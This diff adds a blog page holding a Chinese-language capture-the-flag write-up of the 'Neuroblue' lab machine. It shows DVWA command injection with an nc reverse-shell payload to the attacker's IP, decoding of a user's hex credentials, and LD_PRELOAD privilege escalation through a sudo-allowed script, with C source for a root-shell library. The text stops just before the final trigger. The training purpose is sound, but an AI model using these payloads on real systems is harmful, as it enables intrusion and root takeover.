@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPH.github.io/plugins/theme.js'></script><script src='https://7r1UMPH.github.io/plugins/StatsSidebar.js'></script>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
+<meta name="description" content="## 渗透测试报告 - Neuroblue
+
+## 1. 简介
+
+**靶机名称**: Neuroblue
+**难度**: 简单
+**攻击者 IP:** `192.168.205.188` (Kali Linux)
+**目标 IP:** `192.168.205.203` (Neuroblue)
+
+## 2. 信息收集 (Enumeration)
+
+### 2.1. 网络发现 (Network Discovery)
+
+使用 `arp-scan` 在本地网络中探测存活主机。">
+<meta property="og:title" content="渗透测试报告 - Neuroblue (测试靶机)">
+<meta property="og:description" content="## 渗透测试报告 - Neuroblue
+
+## 1. 简介
+
+**靶机名称**: Neuroblue
+**难度**: 简单
+**攻击者 IP:** `192.168.205.188` (Kali Linux)
+**目标 IP:** `192.168.205.203` (Neuroblue)
+
+## 2. 信息收集 (Enumeration)
+
+### 2.1. 网络发现 (Network Discovery)
+
+使用 `arp-scan` 在本地网络中探测存活主机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png">
+<title>渗透测试报告 - Neuroblue (测试靶机)</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">渗透测试报告 - Neuroblue (测试靶机)</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/63" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h2>渗透测试报告 - Neuroblue</h2>
+<h2>1. 简介</h2>
+<p><strong>靶机名称</strong>: Neuroblue<br>
+<strong>难度</strong>: 简单<br>
+<strong>攻击者 IP:</strong> <code class="notranslate">192.168.205.188</code> (Kali Linux)<br>
+<strong>目标 IP:</strong> <code class="notranslate">192.168.205.203</code> (Neuroblue)</p>
+<h2>2. 信息收集 (Enumeration)</h2>
+<h3>2.1. 网络发现 (Network Discovery)</h3>
+<p>使用 <code class="notranslate">arp-scan</code> 在本地网络中探测存活主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l        
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       (Unknown)
+192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
+192.168.205.203 08:00:27:53:84:22       (Unknown) <span class="pl-c"><span class="pl-c">#</span> &lt;-- 发现目标</span>
+192.168.205.254 00:50:56:ec:d6:ae       (Unknown)
+
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.871 seconds (136.83 hosts/sec). 4 responded</pre></div>
+<p>目标主机 IP 确定为 <code class="notranslate">192.168.205.203</code>。MAC 地址 <code class="notranslate">08:00:27:53:84:22</code>。</p>
+<h3>2.2. 端口扫描 (Port Scanning)</h3>
+<p>使用 <code class="notranslate">nmap</code> 对目标进行端口扫描，识别开放的 TCP 端口。</p>
+<ul>
+<li>
+<p>进行全端口扫描 (<code class="notranslate">-p-</code>) 确定开放端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -p- 192.168.205.203 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 02:10 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.203
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:53:84:22 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) <span class="pl-c"><span class="pl-c">#</span> &lt;-- 确认 VirtualBox</span>
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 5.15 seconds</pre></div>
+<p>结果显示目标开放了两个常见的端口：<code class="notranslate">22 (SSH)</code> 和 <code class="notranslate">80 (HTTP)</code>。</p>
+</li>
+</ul>
+<h3>2.3. Web 服务探测 (Web Enumeration)</h3>
+<p>访问 80 端口的 HTTP 服务 <code class="notranslate">http://192.168.205.203/wordpress/</code>。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5f274ac48ec0d4b0b4106666cc8295ca667f0fd12023044899149e93cb3c6d64/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313134323037352e706e67"><img src="https://camo.githubusercontent.com/5f274ac48ec0d4b0b4106666cc8295ca667f0fd12023044899149e93cb3c6d64/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313134323037352e706e67" alt="DVWA Login Page" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141142075.png" style="max-width: 100%;"></a></p>
+<p>页面显示为 DVWA (Damn Vulnerable Web Application) 的登录界面。DVWA 是一个知名的故意包含漏洞的 Web 应用，用于安全测试和学习。</p>
+<p>DVWA 通常有默认的登录凭据。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/df8a30451394900b5435da210a83e40a1b084a8f303774f35aab057aeabc2f73/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313331303031342e706e67"><img src="https://camo.githubusercontent.com/df8a30451394900b5435da210a83e40a1b084a8f303774f35aab057aeabc2f73/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313331303031342e706e67" alt="DVWA Logged In" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141310014.png" style="max-width: 100%;"></a></p>
+<h2>3. 获取初始访问权限 (Initial Access - DVWA Command Injection)</h2>
+<h3>3.1. 漏洞发现与利用 (Vulnerability Discovery &amp; Exploitation)</h3>
+<ul>
+<li>
+<p><strong>登录 DVWA:</strong> 尝试使用 DVWA 的默认凭据 <code class="notranslate">admin</code> / <code class="notranslate">password</code>。成功登录。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/33b73c60fa4ed81bc6358463bff58112d633a38d76b0dee3820a06372f087d80/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313430353934382e706e67"><img src="https://camo.githubusercontent.com/33b73c60fa4ed81bc6358463bff58112d633a38d76b0dee3820a06372f087d80/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313430353934382e706e67" alt="image-20250501141405799" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141405948.png" style="max-width: 100%;"></a></p>
+</li>
+<li>
+<p><strong>寻找注入点:</strong> 浏览 DVWA 的功能模块，发现 "Command Injection" 模块。</p>
+</li>
+<li>
+<p><strong>初步测试:</strong> 尝试执行简单命令，如 <code class="notranslate">127.0.0.1; id</code>。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3110c722cda17637ccf2a955cbf67945b277233c7f82784a337b9bc70cf73c28/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313534363233332e706e67"><img src="https://camo.githubusercontent.com/3110c722cda17637ccf2a955cbf67945b277233c7f82784a337b9bc70cf73c28/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313534363233332e706e67" alt="Initial Command Injection Attempt (Blocked)" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141546233.png" style="max-width: 100%;"></a></p>
+<p>初始尝试被 DVWA 的安全级别阻止。</p>
+</li>
+<li>
+<p><strong>降低安全级别:</strong> DVWA 允许调整安全级别。导航到 "DVWA Security" 页面，将安全级别设置为 "Low"。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0b487a679fc6ba225c662392228ed464c18e60ec7e3fe3d2bd0ab042eb143c7d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313633343530352e706e67"><img src="https://camo.githubusercontent.com/0b487a679fc6ba225c662392228ed464c18e60ec7e3fe3d2bd0ab042eb143c7d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313633343530352e706e67" alt="Setting Security Level to Low" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141634505.png" style="max-width: 100%;"></a></p>
+</li>
+<li>
+<p><strong>再次测试:</strong> 在 "Low" 安全级别下，再次尝试命令注入。输入 <code class="notranslate">127.0.0.1; id</code>。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/78cbd1e6b12ce7c55e592227ba6d43d03a4ddf11aacd35c14eab3cd92143fb89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313734363239352e706e67"><img src="https://camo.githubusercontent.com/78cbd1e6b12ce7c55e592227ba6d43d03a4ddf11aacd35c14eab3cd92143fb89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134313734363239352e706e67" alt="Successful Command Injection (Low Security)" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501141746295.png" style="max-width: 100%;"></a></p>
+<p>命令 <code class="notranslate">id</code> 成功执行，确认存在命令注入漏洞。</p>
+</li>
+<li>
+<p><strong>构造反弹 Shell Payload:</strong> 为了获取交互式 Shell，构造一个反弹 Shell Payload。<br>
+Payload: <code class="notranslate">127.0.0.1;nc 192.168.205.188 8888 -e /bin/bash</code></p>
+</li>
+<li>
+<p><strong>设置监听器:</strong> 在攻击机 (Kali) 上使用 <code class="notranslate">nc</code> 设置监听器，等待反弹连接。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
+└─$ nc -lvnp 8888            
+listening on [any] 8888 ...</pre></div>
+</li>
+<li>
+<p><strong>执行 Payload:</strong> 在 DVWA 的命令注入页面提交反弹 Shell Payload。</p>
+</li>
+</ul>
+<h3>3.2. 获取 Shell (Gaining Access)</h3>
+<p>提交 Payload 后，DVWA 页面会持续加载。返回 Kali 终端，监听器应收到连接。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
+└─$ nc -lvnp 8888            
+listening on [any] 8888 ...
+connect to [192.168.205.188] from (UNKNOWN) [192.168.205.203] 35542 <span class="pl-c"><span class="pl-c">#</span> &lt;-- 连接成功</span></pre></div>
+<ul>
+<li>
+<p><strong>稳定 Shell:</strong> 获得的初始 Shell 通常功能有限。使用标准技术提升为功能更全的 TTY Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在反弹 shell 中执行</span>
+script /dev/null -c bash  
+<span class="pl-c"><span class="pl-c">#</span> 按 Ctrl+Z 暂停</span>
+<span class="pl-c"><span class="pl-c">#</span> 在 Kali 终端执行</span>
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+<span class="pl-c"><span class="pl-c">#</span> 按 Enter 恢复，然后继续在反弹 shell 中执行</span>
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 40 columns 178 <span class="pl-c"><span class="pl-c">#</span> 可选，调整大小</span></pre></div>
+</li>
+<li>
+<p><strong>确认用户:</strong> 检查当前用户身份。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) </pre></div>
+<p>成功以 <code class="notranslate">www-data</code> 用户身份获得初始访问权限。</p>
+</li>
+</ul>
+<h2>4. 权限提升 (<code class="notranslate">www-data</code> -&gt; <code class="notranslate">welcome</code> -&gt; <code class="notranslate">root</code>)</h2>
+<h3>4.1. 以 <code class="notranslate">www-data</code> 身份进行信息收集 (Enumeration as <code class="notranslate">www-data</code>)</h3>
+<ul>
+<li>
+<p><strong>探索家目录:</strong> 检查 <code class="notranslate">/home</code> 目录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ <span class="pl-c1">cd</span> /home/
+www-data@Neuroblue:/home$ ls -al
+total 12
+drwxr-xr-x  3 root    root    4096 Apr 11 22:27 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
+drwxrwxrwx  2 welcome welcome 4096 Apr 30 09:17 welcome</pre></div>
+</li>
+<li>
+<p><strong>检查 <code class="notranslate">welcome</code> 目录:</strong> 查看 <code class="notranslate">welcome</code> 用户的主目录内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home$ <span class="pl-c1">cd</span> welcome/
+www-data@Neuroblue:/home/welcome$ ls -al
+total 48
+drwxrwxrwx 2 welcome welcome  4096 Apr 30 09:17 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root    root     4096 Apr 11 22:27 ..
+lrwxrwxrwx 1 root    root        9 Apr 30 07:10 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 welcome welcome   220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome  3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome   807 Apr 11 22:27 .profile
+lrwxrwxrwx 1 root    root        9 Apr 30 09:17 .viminfo -<span class="pl-k">&gt;</span> /dev/null
+-rwx--x--x 1 root    root    22208 Apr 30 08:09 2048_hack <span class="pl-c"><span class="pl-c">#</span> &lt;-- 可执行文件</span>
+-rw-r--r-- 1 root    root       44 Apr 30 07:10 user.txt <span class="pl-c"><span class="pl-c">#</span> &lt;-- 用户 Flag</span></pre></div>
+</li>
+<li>
+<p><strong>获取 User Flag:</strong> 读取 <code class="notranslate">user.txt</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home/welcome$ cat user.txt 
+flag{user-aa85e179cb0acf7cc4da7d2afcd53488}</pre></div>
+</li>
+<li>
+<p><strong>分析 <code class="notranslate">2048_hack</code> 程序:</strong> 检查这个可执行文件的帮助信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home/welcome$ ./2048_hack --help
+Usage: 2048 [OPTION] <span class="pl-k">|</span> [MODE]
+Play the game 2048 <span class="pl-k">in</span> the console
+
+Options:
+  -h,  --help       Show this <span class="pl-c1">help</span> message.
+  -v,  --version    Press x. <span class="pl-c"><span class="pl-c">#</span> &lt;-- 有趣的提示</span>
+
+Modes:
+  bluered      Use a blue-to-red color scheme (requires 256-color terminal support).
+  blackwhite   The black-to-white color scheme (requires 256-color terminal support).</pre></div>
+<p>提示 "Press x" 值得注意。</p>
+</li>
+<li>
+<p><strong>运行 <code class="notranslate">2048_hack</code> 并交互:</strong> 运行程序并按 'x' 键。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home/welcome$ ./2048_hack 
+<span class="pl-c"><span class="pl-c">#</span> (程序启动，用户按 'x')</span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8aabe209ae1bdc4f1294e18eef458af5bce15d52fc638c04be72556aed6eb955/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134323431393731342e706e67"><img src="https://camo.githubusercontent.com/8aabe209ae1bdc4f1294e18eef458af5bce15d52fc638c04be72556aed6eb955/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134323431393731342e706e67" alt="2048_hack output after pressing x" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501142419714.png" style="max-width: 100%;"></a></p>
+<p>程序提示凭据已保存到 <code class="notranslate">/home/welcome/.cred</code>。</p>
+</li>
+<li>
+<p><strong>获取凭据:</strong> 查看新创建的 <code class="notranslate">.cred</code> 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home/welcome$ ls -la
+total 52
+drwxrwxrwx 2 welcome  welcome   4096 May  1 02:23 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root     root      4096 Apr 11 22:27 ..
+lrwxrwxrwx 1 root     root         9 Apr 30 07:10 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r-- 1 welcome  welcome    220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome  welcome   3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 www-data www-data    52 May  1 02:23 .cred
+-rw-r--r-- 1 welcome  welcome    807 Apr 11 22:27 .profile
+lrwxrwxrwx 1 root     root         9 Apr 30 09:17 .viminfo -<span class="pl-k">&gt;</span> /dev/null
+-rwx--x--x 1 root     root     22208 Apr 30 08:09 2048_hack
+-rw-r--r-- 1 root     root        44 Apr 30 07:10 user.txt
+www-data@Neuroblue:/home/welcome$ cat .cred
+77656c636f6d653a666438363966363639333039613737636464</pre></div>
+<p>这是一串十六进制编码的字符串。</p>
+</li>
+<li>
+<p><strong>解码凭据:</strong> 使用工具（如 CyberChef 或在线转换器）将十六进制解码为 ASCII。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/132f833687452729a9497b72f065a1454793187e95b1ea708acc37595cb1b84f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134323531343238322e706e67"><img src="https://camo.githubusercontent.com/132f833687452729a9497b72f065a1454793187e95b1ea708acc37595cb1b84f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303530313134323531343238322e706e67" alt="Hex to ASCII conversion" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250501142514282.png" style="max-width: 100%;"></a></p>
+<p>解码结果为：<code class="notranslate">welcome:fd869f669309a77cdd</code>。这是 <code class="notranslate">welcome</code> 用户的凭据。</p>
+</li>
+</ul>
+<h3>4.2. 切换用户 (<code class="notranslate">www-data</code> -&gt; <code class="notranslate">welcome</code>)</h3>
+<p>使用获取到的凭据切换到 <code class="notranslate">welcome</code> 用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Neuroblue:/home/welcome$ su welcome
+Password: 
+welcome@Neuroblue:<span class="pl-k">~</span>$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
+<p>成功切换到 <code class="notranslate">welcome</code> 用户。</p>
+<h3>4.3. 以 <code class="notranslate">welcome</code> 身份进行信息收集 (寻找提权向量)</h3>
+<p>检查 <code class="notranslate">welcome</code> 用户的 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Neuroblue:/tmp$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on Neuroblue:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User welcome may run the following commands on Neuroblue:
+    (root) NOPASSWD: /opt/export <span class="pl-c"><span class="pl-c">#</span> &lt;-- 允许以 root 无密码执行 /opt/export</span></pre></div>
+<p>同时，查看 <code class="notranslate">/opt/export</code> 脚本的内容和权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Neuroblue:/tmp$ cat /opt/export
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-k">if</span> [ <span class="pl-k">-z</span> <span class="pl-smi">$1</span> ] <span class="pl-k">;</span><span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>This is VMBreaker export program.<span class="pl-pds">"</span></span>
+        /usr/local/sbin/VMBreaker
+        <span class="pl-c1">exit</span> 1
+<span class="pl-k">fi</span>
+
+<span class="pl-k">export</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$1</span><span class="pl-pds">"</span></span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span><span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> &lt;-- 关键：使用参数设置环境变量</span>
+<span class="pl-k">export</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$3</span><span class="pl-pds">"</span></span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$4</span><span class="pl-pds">"</span></span>
+<span class="pl-k">export</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$5</span><span class="pl-pds">"</span></span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$6</span><span class="pl-pds">"</span></span>
+<span class="pl-k">export</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$7</span><span class="pl-pds">"</span></span>=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$8</span><span class="pl-pds">"</span></span>
+/usr/local/sbin/VMBreaker <span class="pl-c"><span class="pl-c">#</span> &lt;-- 最后执行另一个程序</span>
+
+welcome@Neuroblue:/tmp$ ls -al /opt/export 
+-rwxr-xr-x 1 root root 207 Apr 30 08:55 /opt/export</pre></div>
+<p><strong>关键发现:</strong></p>
+<ol>
+<li><code class="notranslate">welcome</code> 用户可以无需密码以 root 权限执行 <code class="notranslate">/opt/export</code>。这是提权的入口。</li>
+<li><code class="notranslate">sudoers</code> 配置中包含 <code class="notranslate">env_reset</code>，这意味着通过 <code class="notranslate">sudo</code> 直接传递 <code class="notranslate">LD_PRELOAD</code> 环境变量（如 <code class="notranslate">sudo LD_PRELOAD=... /opt/export</code>）会被阻止。</li>
+<li><code class="notranslate">/opt/export</code> 脚本本身存在一个<strong>严重漏洞</strong>：它将命令行参数直接用作 <code class="notranslate">export</code> 命令的参数，允许我们控制脚本内部设置的环境变量名称和值。</li>
+<li>脚本最后会执行 <code class="notranslate">/usr/local/sbin/VMBreaker</code>。</li>
+</ol>
+<h3>4.4. 利用策略 (Exploitation Strategy - Exploiting Script Argument Handling for LD_PRELOAD Injection)</h3>
+<p>我们的目标是利用 <code class="notranslate">/opt/export</code> 脚本的漏洞来设置 <code class="notranslate">LD_PRELOAD</code> 环境变量，从而劫持后续 <code class="notranslate">/usr/local/sbin/VMBreaker</code> 的执行流程。</p>
+<p>计划：</p>
+<ol>
+<li>编写一个 C 文件 (<code class="notranslate">exp.c</code>)，包含一个构造函数 (<code class="notranslate">__attribute__((constructor))</code>)。这个函数会在库被加载时自动执行，其功能是设置 <code class="notranslate">uid</code> 和 <code class="notranslate">gid</code> 为 0，然后启动一个具有 root 权限的 shell (<code class="notranslate">/bin/bash -p</code>)。</li>
+<li>将 <code class="notranslate">exp.c</code> 编译成共享库文件 <code class="notranslate">/tmp/exp.so</code>。</li>
+<li>执行 <code class="notranslate">sudo /opt/export</code> 命令，巧妙地将 <code class="notranslate">LD_PRELOAD</code> 作为第一个参数 (<code class="notranslate">$1</code>)，将我们恶意库的路径 <code class="notranslate">/tmp/exp.so</code> 作为第二个参数 (<code class="notranslate">$2</code>) 传递给脚本。</li>
+<li>脚本执行到 <code class="notranslate">export "$1"="$2"</code> 时，就会在 <strong>root 权限</strong>下执行 <code class="notranslate">export LD_PRELOAD=/tmp/exp.so</code>。</li>
+<li>当脚本最后执行 <code class="notranslate">/usr/local/sbin/VMBreaker</code> 时，由于 <code class="notranslate">LD_PRELOAD</code> 环境变量已被设置，动态链接器会优先加载 <code class="notranslate">/tmp/exp.so</code>，从而执行我们的恶意代码，获得 root shell。</li>
+</ol>
+<h3>4.5. 执行利用 (Executing the Exploit)</h3>
+<ol>
+<li>
+<p><strong>创建恶意 C 代码:</strong><br>
+切换到可写目录 <code class="notranslate">/tmp</code>，创建 <code class="notranslate">exp.c</code> 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Neuroblue:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /tmp
+welcome@Neuroblue:/tmp$ cat <span class="pl-s"><span class="pl-k">&lt;&lt;</span> <span class="pl-k">EOF</span> &gt; exp.c</span>
+<span class="pl-s">#define _GNU_SOURCE</span>
+<span class="pl-s">#include &lt;stdio.h&gt;</span>
+<span class="pl-s">#include &lt;stdlib.h&gt;</span>
+<span class="pl-s">#include &lt;unistd.h&gt;</span>
+<span class="pl-s">#include &lt;dlfcn.h&gt;</span>
+<span class="pl-s"></span>
+<span class="pl-s">// 构造函数，在库加载时自动执行</span>
+<span class="pl-s">void __attribute__((constructor)) _init() {</span>
+<span class="pl-s">    unsetenv("LD_PRELOAD"); // 清理环境变量，避免影响子shell</span>
+<span class="pl-s">    setuid(0);             // 设置UID为root</span>
+<span class="pl-s">    setgid(0);             // 设置GID为root</span>
+<span class="pl-s">    system("/bin/bash -p"); // 执行一个保留权限的root shell</span>
+<span class="pl-s">    exit(0); // 执行完shell后退出，避免后续程序执行（可选）</span>
+<span class="pl-s">}</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
+</li>
+<li>
+<p><strong>编译共享库:</strong><br>
+使用 <code class="notranslate">gcc</code> 编译 C 代码为共享库。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Neuroblue:/tmp$ gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c -nostartfiles
+welcome@Neuroblue:/tmp$ ls -l /tmp/exp.so
+-rwxr-xr-x 1 welcome welcome 14736 May  1 02:29 /tmp/exp.so <span class="pl-c"><span class="pl-c">#</span> &lt;-- 编译成功</span></pre></div>
+</li>
+<li>
+<p><strong>触发漏洞并注入:</strong><br>
